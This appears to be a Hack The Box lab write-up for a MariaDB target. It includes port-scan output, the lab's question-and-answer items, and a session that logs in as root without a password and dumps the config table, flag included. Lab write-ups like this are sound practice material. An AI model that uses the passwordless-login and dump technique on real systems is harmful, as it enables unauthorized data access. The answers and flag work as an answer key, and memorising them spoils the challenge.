ip: 10.129.242.8
rustscan:
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack

nmap:

PORT     STATE SERVICE REASON  VERSION
3306/tcp open  mysql?  syn-ack
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 70
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, ODBCClient, SupportsCompression, Speaks41ProtocolNew, FoundRows, InteractiveClient, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ==W"=PYQf/T:emt~=Re(
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

What does the acronym SQL stand for?
structured query language
During our scan, which port running mysql do we find?
3306
What community-developed MySQL version is the target running?
MariaDB
What switch do we need to use in order to specify a login username for the MySQL service?
-u
Which username allows us to log into MariaDB without providing a password?
root
What symbol can we use to specify within the query that we want to display everything inside a table?
*
What symbol do we need to end each query with?
;
Submit root flag

mariadb -h 10.129.242.8 -u root
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.058 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.055 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.071 sec)





